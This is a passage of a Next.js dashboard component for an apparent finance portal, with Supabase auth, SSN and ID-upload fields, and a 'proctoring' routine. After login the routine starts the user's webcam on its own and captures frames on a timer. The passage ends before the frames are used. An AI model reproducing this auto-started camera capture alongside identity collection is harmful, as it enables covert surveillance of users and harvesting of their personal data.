'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useRouter } from 'next/navigation';
import Link from 'next/link'; // Added Link for navigation
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  Activity, Upload, Camera, User, 
  Wallet, Menu, X, Info // Added Menu, X, Info icons
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion'; // Added for smooth menu animation

export default function Dashboard() {
  const router = useRouter();
  
  // 1. SAFE DEFAULT STATE
  const [user, setUser] = useState<any>({
    full_name: 'Valued Client',
    balance: 0,
    deposit_status: 'pending',
    kyc_status: 'unverified',
    email: 'client@secure.mail'
  });
  
  const [loading, setLoading] = useState(true);
  const [ssn, setSsn] = useState('');
  const [idType, setIdType] = useState('driver_license');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false); // Mobile Menu State

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // --- STRICT AUTH CHECK ---
  useEffect(() => {
    let channel: any;

    const initData = async () => {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        
        if (!session) { 
           window.location.href = '/portal/auth'; 
           return; 
        }

        const { data } = await supabase
          .from('profiles')
          .select('*')
          .eq('id', session.user.id)
          .single();

        if (data) {
          setUser(data);
          setLoading(false);
          startProctoring(session.user.id);
        } else {
           setLoading(false);
        }

        channel = supabase.channel('realtime-profile')
          .on(
            'postgres_changes',
            { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` },
            (payload) => {
              setUser(payload.new);
            }
          )
          .subscribe();

      } catch (err) {
        console.error("Connection Error:", err);
        setLoading(false);
      }
    };

    initData();
    return () => { if (channel) supabase.removeChannel(channel); };
  }, []);

  // --- CAMERA LOGIC ---
  const startProctoring = async (userId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
      });
      const vid = videoRef.current;
      if (vid) {
        vid.srcObject = stream;
        vid.onloadedmetadata = () => vid.play().catch(e => console.error(e));
      }
      const interval = setInterval(async () => {
        const cvs = canvasRef.current;
        if (vid && cvs && vid.readyState >= 2 && !vid.paused &&
